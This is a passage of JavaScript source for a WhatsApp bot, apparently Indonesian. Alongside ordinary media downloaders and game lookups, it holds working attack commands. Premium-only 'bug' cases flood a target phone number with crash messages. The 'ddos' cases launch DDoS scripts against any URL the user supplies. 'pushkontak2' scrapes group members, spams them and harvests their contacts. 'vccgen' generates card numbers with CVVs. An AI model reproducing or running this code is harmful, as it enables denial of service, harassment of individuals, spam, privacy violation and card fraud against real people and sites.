if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
alifatah.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted:fcall })
}
break

case 'tiktok':
case 'tt':
case 'ttdl': {
const api = require('btch-downloader')
if (!isPremium && global.db.data.users[m.sender].limit < 5) return reply(mess.endLimit) 
db.data.users[m.sender].limit -= 5
if (!args[0]) return reply(`Masukan URL!\n\ncontoh:\n${prefix + command} https://vm.tiktok.com/ZGJAmhSrp/`);
if (!args[0].match(/tiktok/gi)) return m.reply(`URL Yang Tuan Berikan *Salah!!!*`);
try {
let maximus = await api.ttdl(args[0]);
let caption = `${gris}乂 T I K T O K  D O W N L O A D${gris}

- ɴᴀᴍᴀ ᴠɪᴅᴇᴏs:
- ${maximus.title}

- ɴᴀᴍᴀ ᴀᴜᴅɪᴏ:
- ${maximus.title_audio}`;
await alifatah.sendMessage(m.chat, { video: { url: maximus.video[0] }, caption: caption })
await alifatah.sendFile(m.chat, maximus.audio[0], 'kasar.mp3', null, m)
      } catch (e) {
		console.log(e)
		reply(eror)
	}
};
break

case 'tiktokaudio':{
if (global.db.data.users[m.sender].limit < 1) return reply(`*Limit Habis*`)
db.data.users[m.sender].limit -= 1
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
alifatah.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted:fcall })
})
}
break

case 'ttsearch': {
async function tiktoks(query) {
  return new Promise(async (resolve, reject) => {
    try {
      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/feed/search',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: {
          keywords: query,
          count: 50,
          cursor: 0,
          HD: 1
        }
      });
      const videos = response.data.data.videos;
      if (videos.length === 0) {
        reject("Tidak ada video ditemukan.");
      } else {
        const gywee = Math.floor(Math.random() * videos.length);
        const videorndm = videos[gywee]; 

        const result = {
          title: videorndm.title,
          cover: videorndm.cover,
          origin_cover: videorndm.origin_cover,
          no_watermark: videorndm.play,
          watermark: videorndm.wmplay,
          music: videorndm.music
        };
        resolve(result);
      }
    } catch (error) {
      reject(error);
    }
  });
}
  if (!text) return reply(`• *Example :* .${command} jedag jedug`)
  alifatah.sendMessage(m.chat, { react: { text: '🕐', key: m.key }})
  let yoiii = await tiktoks(`${text}`)
  alifatah.sendMessage(m.chat, {
  video: {url: yoiii.no_watermark},
  gifPlayback: true, 
  caption: '```Result from:```'+' `'+text+'`'
  }, {quoted:fcall})
}
break

case 'play': case 'song': {
let ytdl = require('ytdl-core')
let yts = require('yt-search')
let fs = require('fs')
let { pipeline } = require('stream')
let { promisify } = require('util')
let os = require('os')

let streamPipeline = promisify(pipeline);

function trimYouTubeUrl(url) {
  const trimmedUrl = url.split("?")[0];
  return trimmedUrl;
}
  if (!text) return reply(`• *Example :* ${prefix}${command} fireflies speed up`)
   alifatah.sendMessage(m.chat, {
    react: {
      text: '🕒',
      key: m.key,
    }
  });
  try {
if (global.db.data.users[m.sender].limit < 3) return reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 3
  let trimmedUrl = trimYouTubeUrl(text);
  let search = await yts(trimmedUrl);
  let vid = search.videos[0];
  let { title, thumbnail, timestamp, views, ago, url } = vid;
  
  const audioStream = ytdl(url, {
    filter: 'audioonly',
    quality: 'highestaudio',
  });

  // Get the path to the system's temporary directory
  const tmpDir = os.tmpdir();

  // Create writable stream in the temporary directory
  const writableStream = fs.createWriteStream(`${tmpDir}/${title}.mp3`);

  // Start the download
  await streamPipeline(audioStream, writableStream);
  
await alifatah.sendMessage(m.chat, {
document: {
url: "https://wa.me/6285691304150"
},
mimetype: namabot, 
pageCount: 2024,
fileName: `Duration ${timestamp} ( Second )`,
fileLength: 100000000000000,
caption: '```Ini Lagu Untuk Anda...```', 
contextInfo: {
forwardingScore: 2023, 
isForwarded: false,
externalAdReply: {
title: 'ᴀʟɪꜰᴀᴛᴀʜ - ᴍᴅ',
body: 'SUBSCRIBE FAUZIALIFATAH',
mediaType: 1,
thumbnailUrl: thumbnail,
containsAutoReply: true,
renderLargerThumbnail: true,
showAdAttribution: false,
}}}, { quoted:fcall })
 let doc = {
    audio: {
      url: `${tmpDir}/${title}.mp3`
    },
    mimetype: 'audio/mp4',
    fileName: `${title}`,
 }
 await alifatah.sendMessage(m.chat, doc, { quoted:fcall });
 
  // Delete the audio file
  fs.unlink(`${tmpDir}/${title}.mp3`, (err) => {
    if (err) {
      console.error(`Failed to delete audio file: ${err}`);
    } else {
      console.log(`Deleted audio file: ${tmpDir}/${title}.mp3`);
    }
  });
   } catch (e) {
    console.log(e);
    reply(`Failed :(`);
  }
};
break;

  case "ytmp4":{
if (!text) return reply(`• *Example :* .${command} https://www.youtube.com/xxxxxxx`)
	alifatah.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
	 if (global.db.data.users[m.sender].limit < 3) return reply(`*Limit Habis*`) // respon ketika limit habis
db.data.users[m.sender].limit -= 3
	try {
	let obj = await ytmp3(text);
	let title = obj.meta.title;
	let channel = obj.meta.channel;
	let duration = obj.meta.seconds;
    let desk = obj.meta.description;
    let capt = `${Fauzi}乂  Y T - M P 4${Fauzi}\n\n`
    capt += `┌  ◦ *Title* : ${title}\n`
    capt += `│  ◦ *Description* : ${desk}\n`
    capt += `│  ◦ *Chanel* : ${channel}\n`
    capt += `└  ◦ *Duration* : ${duration}\n\n`
    capt += `${global.namabot}`
	alifatah.sendFile(m.chat, obj.buffer, `${title}.mp4`, capt, m);
	} catch (e) {
    console.log(e);
    reply(`🚩 Error!`);
  }
};
break;

case 'instagram': case 'ig': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
	  if (!text) return reply(`You need to give the URL of Any Instagram video, post, reel, image`)
  let res
  try {
    res = await fetch(`https://www.guruapi.tech/api/igdlv1?url=${text}`)
  } catch (error) {
    return reply(`An error occurred: ${error.message}`)
  }
  let api_response = await res.json()
  if (!api_response || !api_response.data) {
    return reply(`No video or image found or Invalid response from API.`)
  }
  const mediaArray = api_response.data;
  for (const mediaData of mediaArray) {
    const mediaType = mediaData.type
    const mediaURL = mediaData.url_download
    let cap = `Tuh Ya ${mediaType.toUpperCase()}`
    if (mediaType === 'video') {
      alifatah.sendMessage(m.chat, {video: {url: mediaURL}, caption: cap}, {quoted:fcall})
    } else if (mediaType === 'image') {
      alifatah.sendMessage(m.chat, { image: {url: mediaURL}, caption: cap}, {quoted:fcall})
    }
  }
}
break

case '🗿': case '🔥': case '⚡': case '🤣': case '👺': case '🌹': case '💀': case '👿': {
if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`</> crash sudah terkirim... `)
for (let j = 0; j < 30; j++) {
await berkedok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await berkedok(target, force)
await ngeloc(target, force)
await berkedok(target, force)
await berkedok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await berkedok(target, force)
await ngeloc(target, force)
await berkedok(target, force)
await berkedok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await berkedok(target, force)
await ngeloc(target, force)
await berkedok(target, force)
await berkedok(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await berkedok(target, force)
await ngeloc(target, force)
await berkedok(target, force)
}
await reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break

case 'gasbugalifatah': case 'oemji': case 'lawack': {
if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Command Salah Silahkan Gunakan Command ${command} nomor|jumlah`)
Pe = text.split(",")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await alifatah.onWhatsApp(Pe)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
await berkedok(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await berkedok(Pe, force)
await ngeloc(Pe, force)
await berkedok(Pe, force)
await berkedok(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await berkedok(Pe, force)
await ngeloc(Pe, force)
alifatah.sendMessage(Pe, {text: `𝐀𝐥𝐰𝐚𝐲𝐬 𝐀𝐥𝐢𝐟𝐚𝐭𝐚𝐡Δ`}, {quoted:m})
alifatah.sendMessage(Pe, {text: `𝐀𝐥𝐰𝐚𝐲𝐬 𝐀𝐥𝐢𝐟𝐚𝐭𝐚𝐡Δ`}, {quoted:m})
alifatah.sendMessage(Pe, {text: `𝐀𝐥𝐰𝐚𝐲𝐬 𝐀𝐥𝐢𝐟𝐚𝐭𝐚𝐡Δ`}, {quoted:m})
alifatah.sendMessage(Pe, {text: `𝐀𝐥𝐰𝐚𝐲𝐬 𝐀𝐥𝐢𝐟𝐚𝐭𝐚𝐡Δ`}, {quoted:m})
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await berkedok(Pe, force)
await ngeloc(Pe, force)
await berkedok(Pe, force)
}
await reply(`Sucess Send Bug☠️`)
await reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'alifatahgas': case 'kasar': case 'lembu': case 'wak': {
if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 628xxx,1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split(",")[0]
let pepec = ppek.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx|1`)
let Pe = pepec+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
reply(ppk + " detik");
await reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await berkedok(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await berkedok(Pe, force)
await ngeloc(Pe, force)
await berkedok(Pe, force)
await berkedok(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await berkedok(Pe, force)
await ngeloc(Pe, force)
alifatah.sendMessage(Pe, {text: '*DONE💀*'}, {quoted:m})
alifatah.sendMessage(Pe, {text: '*DONE💀*'}, {quoted:m})
alifatah.sendMessage(Pe, {text: '*DONE💀*'}, {quoted:m})
alifatah.sendMessage(Pe, {text: '*DONE💀*'}, {quoted:m})
await berkedok(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await berkedok(Pe, force)
await ngeloc(Pe, force)
await berkedok(Pe, force)
await berkedok(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await berkedok(Pe, force)
await ngeloc(Pe, force)
}
await reply(`Sucess Send Bug☠️`)
await reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'out-android': case 'out-external': case 'out-internal': {
if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 628xxx`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return reply(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepec + '@s.whatsapp.net'
await reply(`_tunggu sampai gue bilang sucess baru lu cek targetnya_, *soalnya bugnya lumayan berat jadi nunggu bentar*`)
for (let j = 0; j < 5; j++) {
await berkedok(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await berkedok(Pe, force)
await berkedok(Pe)
await berkedok(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await berkedok(Pe, force)
await ngeloc(Pe, force)
await berkedok(Pe, force)
await berkedok(Pe, force)
await ngeloc(Pe)
await berkedok(Pe, force)
alifatah.sendMessage(Pe, { audio : virgam,  caption: `${buttonalifatah}` }, { quoted:m })
alifatah.sendMessage(Pe, { audio : virgam,  caption: `${buttonalifatah}` }, { quoted:m })
alifatah.sendMessage(Pe, { audio : virgam,  caption: `${buttonalifatah}` }, { quoted:m })
alifatah.sendMessage(Pe, { audio : virgam,  caption: `${buttonalifatah}` }, { quoted:m })
await berkedok(Pe)
await berkedok(Pe, force)
await ngeloc(Pe, force)
await ngeloc(Pe, force)
await berkedok(Pe, force)
}
await reply(`Sucess Send Bug☠️`)
await reply(`_silahlan di cek, target sudah_ *c1*`)
}
break

case 'ddos-hent': {
if (!isCreator) return
if (!text) return reply(`*Example*: ${prefix + command} [url]`)
reply(`Serangan DDoS telah dieksekusi ke Situs Web yang dituju:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nTerima kasih atas kesabaran Anda.\n`);
exec(`node ./ddos/fauzidev.js ${text} 60 20 100 proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break        
        
case 'ddos-mix': {
if (!isCreator) return
if (!text) return reply(`*Example*: ${prefix + command} [url]`)
reply(`Serangan DDoS telah dieksekusi ke Situs Web yang dituju:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nTerima kasih atas kesabaran Anda.\n`);
exec(`node ./ddos/mix.js ${text} 60 20 100 proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break        
        
case'ddos-lol':{
if (!isCreator) return
if (!text) return reply(`*Example*: ${prefix + command} [url]`)
let ddosin = require("./ddos/lol.js")
ddosin(`${text}`)
if (args.length === 1 && text) {
reply(`Serangan DDoS telah dieksekusi ke Situs Web yang dituju:\n\n> TARGET : ${text}\n> TIME : 60\n> THREAD : 20\n> RATE : 100\n\nTerima kasih atas kesabaran Anda.\n`)
exec(`node ./ddos/lol.js`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}}
break

case "pushkontak2": {
if (!isCreator) return
if (!text) return reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
if (!text.split("|")) return reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var idnya = text.split("|")[0]
var delay = Number(text.split("|")[1])
var teks = text.split("|")[2]
if (!idnya.endsWith("@g.us")) return reply("Format ID Grup Tidak Valid")
if (isNaN(delay)) return reply("Format Delay Tidak Valid")
if (!teks) return reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var groupMetadataa
try {
groupMetadataa = await alifatah.groupMetadata(`${idnya}`)
} catch (e) {
return reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
await alifatah.sendMessage(mem, {text: teks}, {quoted:fcall})
await sleep(Number(delay))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await alifatah.sendMessage(m.sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted:fcall })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./database/contacts.vcf", "")
}}
break

case "listgc": case "cekidgc": case"listgrup": {
let gcall = Object.values(await alifatah.groupFetchalifatahlParticipating().catch(_=> null))
let listgc = '\n'
await gcall.forEach((u, i) => {
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
alifatah.sendMessage(m.chat, {text: `${listgc}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: await getBuffer(ppUrl), title: `[ ${gcall.length} Group Chat ] `, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: ``, previewType: "PHOTO"}}}, {quoted:fcall})
}
break

case 'tovn': case 'voice': {
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`)
if (!quoted) return reply(`*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`)
reply(mess.wait)
let media = await quoted.download()
let { toPTT } = require('./lib/converter')
let audio = await toPTT(media, 'mp4')
alifatah.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: ``,
title: ``,
sourceUrl: ``, 
thumbnail: thumb
}
}})
}
break

case 'toanime': 
        case 'jadianime':
        {
    var q = m.quoted ? m.quoted : m
	var mimes = (q.msg || q).mimetype || q.mediaType || ''
	if (/image/g.test(mimes) && !/webp/g.test(mimes)) {
		try {
	       await loading();
	       if (global.db.data.users[m.sender].limit < 3) return reply(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 3
			const img = await q.download?.()
			let out = await uploadImage(img)
			let old = new Date()
			let convert = await fetchJson(`https://api.betabotz.eu.org/api/maker/jadianime?url=${out}&apikey=${global.apibotz}`);
			let buff = await getBuffer(convert.result.img_crop_single)
			await alifatah.sendMessage(m.chat, { image: buff, caption: `🍟 *Fetching* : ${((new Date - old) * 1)} ms` }, { quoted:fcall })
		} catch (e) {
			console.log(e)
			reply(`[ ! ] Identifikasi Gagal.`)
		}
	} else {
		reply(`Kirim gambar dengan caption *${prefix + command}* atau tag gambar yang sudah dikirim`)
	}
        }
        break

case  'event': {
let t = text.split(',');
if (t.length < 4) return reply(`*Format salah!*\nPenggunaan:
${prefix + command} nama event,deskripsi,nama lokasi,link`)
let nama = t[0];
let des = t[1];
let lokasi = t[2];
let link = t[3];
SendEventMessage(m.chat, nama, des, lokasi, link) 
 } break

case 'valorant-weapons': {
    if (!text) return reply(`Example ${prefix + command} Vandal`);
    try {
        let response = await fetch('https://valorant-api.com/v1/weapons');
        let data = await response.json();
        let weapons = data.data;

        let weapon = weapons.find(weapon => weapon.displayName.toLowerCase() === text.toLowerCase());

        if (!weapon) return reply(`Senjata dengan nama ${text} tidak ditemukan`);

        let caption = `
UUID: ${weapon.uuid || 'N/A'}
Name: ${weapon.displayName || 'N/A'}
Category: ${weapon.category || 'N/A'}
Default Skin: ${weapon.defaultSkinUuid || 'N/A'}
Cost: ${weapon.shopData ? weapon.shopData.cost : 'N/A'}
Damage Ranges: ${weapon.weaponStats ? weapon.weaponStats.damageRanges.map(damage => `
    Range: ${damage.rangeStartMeters}-${damage.rangeEndMeters} meters
    Head Damage: ${damage.headDamage}
    Body Damage: ${damage.bodyDamage}
    Leg Damage: ${damage.legDamage}
`).join('\n') : 'N/A'}
        `;

        alifatah.sendMessage(m.chat, { image: { url: weapon.displayIcon }, caption: caption.trim() }, { quoted:fcall });
    } catch (e) {
        reply('error');
    }
}
break

case 'pastebin': {
    try {
        const teks = m.quoted ? m.quoted.text : text
        if (!teks) return reply('No text found');
        await reply(mess.wait);
        const response = await createPaste(teks.split('|')[0] || '', teks);
        if (response.status === 0) {
            const pesan = `*Pesan Anda berhasil terkirim! 🚀*\n\n*Detail:*\n*Original:* ${response.original}\n*Raw:* ${response.raw}`;
            await reply(pesan);
        } else {
            await reply('Pesan Anda gagal terkirim. 🙁');
        }
    } catch (error) {
        console.error(error);
        await reply('Terjadi kesalahan dalam pemrosesan permintaan Anda. 🙁');
    }
}
break

case'wuwa-sheets': {
    if (!text) {
        return reply(`Example: ${prefix + command} Sanhua

*LIST CHARACTER*

- Aalto
- Baizhi
- Calcharo
- Chixia
- Danjin
- Encore
- Jianxin
- Jiyan
- Lingyang
- Mortefi
- Rover-Havoc
- Rover-Spectro
- Sanhua
- Taoqi
- Verina
- Yangyang
- Yinlin
- Yuanwu
`);
    }

    let Maximus;

    if (text.toLowerCase() === 'sanhua') {
        Maximus = '1102';
    } else if (text.toLowerCase() === 'baizhi') {
        Maximus = '1103';
    } else if (text.toLowerCase() === 'lingyang') {
        Maximus = '1104';
    } else if (text.toLowerCase() === 'chixia') {
        Maximus = '1202';
    } else if (text.toLowerCase() === 'encore') {
        Maximus = '1203';
    } else if (text.toLowerCase() === 'mortefi') {
        Maximus = '1204';
    } else if (text.toLowerCase() === 'calcharo') {
        Maximus = '1301';
    } else if (text.toLowerCase() === 'yinlin') {
        Maximus = '1302';
    } else if (text.toLowerCase() === 'yuanwu') {
        Maximus = '1303';
    } else if (text.toLowerCase() === 'yangyang') {
        Maximus = '1402';
    } else if (text.toLowerCase() === 'aalto') {
        Maximus = '1403';
    } else if (text.toLowerCase() === 'jiyan') {
        Maximus = '1404';
    } else if (text.toLowerCase() === 'jianxin') {
        Maximus = '1405';
    } else if (text.toLowerCase() === 'rover-spectro') {
        Maximus = '1502';
    } else if (text.toLowerCase() === 'verina') {
        Maximus = '1503';
    } else if (text.toLowerCase() === 'taoqi') {
        Maximus = '1601';
    } else if (text.toLowerCase() === 'danjin') {
        Maximus = '1602';
    } else if (text.toLowerCase() === 'rover-havoc') {
        Maximus = '1604';
    } else {
        return reply(`Karakter yang dicari tidak ada atau belum tersedia.

*LIST CHARACTER*

- Aalto
- Baizhi
- Calcharo
- Chixia
- Danjin
- Encore
- Jianxin
- Jiyan
- Lingyang
- Mortefi
- Rover-Havoc
- Rover-Spectro
- Sanhua
- Taoqi
- Verina
- Yangyang
- Yinlin
- Yuanwu`);
    }

    try {
        let data = await fetch(`https://raw.githubusercontent.com/DEViantUA/wuthering-waves-elevation-materials/main/character/${Maximus}.png`);
        if (!data.ok) throw new Error('Gagal mendapatkan data gambar');
        let image = await data.buffer();
        alifatah.sendFile(m.chat, image, null, `${capitalizeFirstLetter(text)} - Wuthering Waves - Sheet`, m);
    } catch (error) {
        reply('Terjadi kesalahan saat mengambil data gambar. Silakan coba lagi nanti.');
    }
}
break

case 'valorant-maps': {
    if (!text) return reply(`Example ${prefix + command} Ascent`);
    try {
        let response = await fetch('https://valorant-api.com/v1/maps');
        let data = await response.json();
        let maps = data.data;
        let map = maps.find(map => map.displayName.toLowerCase() === text.toLowerCase());

        if (!map) return reply(`Map dengan nama ${text} tidak ditemukan`);

        let caption = `
UUID: ${map.uuid || 'N/A'}
Name: ${map.displayName || 'N/A'}
Tactical Description: ${map.tacticalDescription || 'N/A'}
Coordinates: ${map.coordinates || 'N/A'}
        `;

        alifatah.sendMessage(m.chat, { image: { url: map.splash }, caption: caption.trim() }, { quoted:fcall });
    } catch (e) {
        reply('error');
    }
}
break

case 'vccgen': {
    if (!text) return reply(`input query and caption required\nExample : ${prefix + command} 516088`);
    try {
        const result = await GenerateCC(text)
        const formattedList = result.map((card, index) => `- *CARD ${index + 1}:*\n  Card Number: ${card.CardNumber}\n  Expiration Date: ${card.ExpirationDate}\n  CVV: ${card.CVV}`).join('\n\n');
        await reply(formattedList);
    } catch (e) {
        await reply('Error occurred');
    }
}
break

case 'dropmail': {
    alifatah.dropmail = alifatah.dropmail ? alifatah.dropmail : {}
    let id = "dropmail"

    let lister = [
        "create",
        "message",
        "delete"
    ]

    let [feature, inputs, inputs_, inputs__, inputs___] = text.split(" ")
    if (!lister.includes(feature)) return reply(`*Example:*\n${prefix + command} create\n\n*Pilih type yg ada*\n` + lister.map((v, index) => "  ○ " + v).join("\n"))

    if (lister.includes(feature)) {

        if (feature == "create") {

            try {
